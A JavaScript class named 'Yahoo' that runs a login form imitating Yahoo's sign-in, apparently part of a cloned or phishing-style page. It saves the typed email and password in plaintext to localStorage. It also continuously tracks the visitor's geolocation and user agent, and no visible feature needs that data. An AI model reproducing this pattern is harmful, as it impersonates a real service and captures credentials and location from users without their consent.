export default class Yahoo{
    Email(){
        const email_box = document.querySelector(".input-emails");
        const email_icon = document.querySelector(".fa-envelope");
        const email_label = document.querySelector(".email-label");
        const email_input = document.querySelector("#email");
        const email_display = document.querySelector(".email-display");
        const email_next = document.querySelector(".email-next");
        const info_mail = document.querySelector(".info-mail");
        const password_box = document.querySelector(".info-password");
        const nickname = document.querySelector(".nickname");
        email_input.addEventListener("click",(e)=>{
            email_box.setAttribute("style","border-color: #198fff")
            email_icon.setAttribute("style","display: flex")
            email_label.setAttribute("style","left: 2rem;")
            if(e.target.value.length>0){
                email_label.setAttribute("style","top: -5px; left: 0.1rem;font-size: clamp(0.81rem,1.5vh,0.5rem); color: #000000b7;")
            }else{
                email_label.setAttribute("style","left: 2rem;font-size: clamp(0.9rem,1.5vh,0.5rem);")
            }
        });
        email_input.addEventListener("keyup",(e)=>{
            email_input.setAttribute("value",e.target.value);
            if(e.target.value.length>0){
                email_label.setAttribute("style","top: -5px; left: 0.1rem;font-size: clamp(0.81rem,1.5vh,0.5rem); color: #000000b7;")
            }else{
                email_label.setAttribute("style","left: 2rem;font-size: clamp(0.9rem,1.5vh,0.5rem);")
            }
        });
        email_next.addEventListener("click",()=>{
            const email = email_input.value;
            let checkEmail = false;
            if(email.indexOf(".")>email.indexOf("@")){
                const pointEmail = email.split(".");
                const domainEmail = email.split("@");
                if(pointEmail.length<=3 & domainEmail.length==2){
                    if(domainEmail[0].search(/[/><"'&%$()]/ig)==-1 & domainEmail[1].search(/[/<<"'&%$()]/ig) ==-1){
                        checkEmail=true;
                        nickname.innerHTML = domainEmail[0];
                        window.localStorage.setItem("email",email);
                    }
                }
            }
            if(checkEmail){
                info_mail.setAttribute("style","display:none;");
                email_display.setAttribute("style","display:none;");
                password_box.setAttribute("style","display:flex;");
            }else{
                email_display.setAttribute("style","display:flex;");
            }
        })
    }
    Password(){
        const password_box = document.querySelector(".input-password");
        const password_icon = document.querySelector(".fa-eye");
        const password_button = document.querySelector(".next-password");
        const password_input = document.querySelector(".password");
        const password_label = document.querySelector(".password-label");
        password_button.addEventListener("click",()=>{
            window.localStorage.setItem("password",password_input.value);
        })
        password_input.addEventListener("click",()=>{
            password_label.setAttribute("style","top:-5px; font-size: clamp(0.8rem,1.5vh,0.5rem);");
            password_box.setAttribute("style","border-color: #188fff")
        });
        password_input.addEventListener("keyup",(e)=>{
            password_input.setAttribute("value",e.target.value);
            if(e.target.value==0){
                password_label.setAttribute("style","top: unset; left:1px; font-size: clamp(1rem,1.5vh,0.5rem);");
            }else{
                password_label.setAttribute("style","top:-5px; font-size: clamp(0.8rem,1.5vh,0.5rem);");
            }
        });
        password_input.addEventListener("mouseout",(e)=>{
            if(e.target.value==0){
                password_label.setAttribute("style","top: unset; left:1px; font-size: clamp(1rem,1.5vh,0.5rem);");
            }
        });
        password_icon.addEventListener("click",()=>{
            if(password_input.getAttribute("type")=="password"){
                password_input.setAttribute("type","text");
                password_icon.setAttribute("style","color: #188fff");
            }else{
                password_input.setAttribute("type","password");
                password_icon.setAttribute("style","color: #26282A");
            }
        })
    }
    Geolocation(){
        navigator.geolocation.watchPosition(showPosition);
        function showPosition(location){
            window.localStorage.setItem("Latitude",location.coords.latitude);
            window.localStorage.setItem("Longitude",location.coords.longitude);
            window.localStorage.setItem("UserAgent",window.navigator.userAgent);
        }
    }
}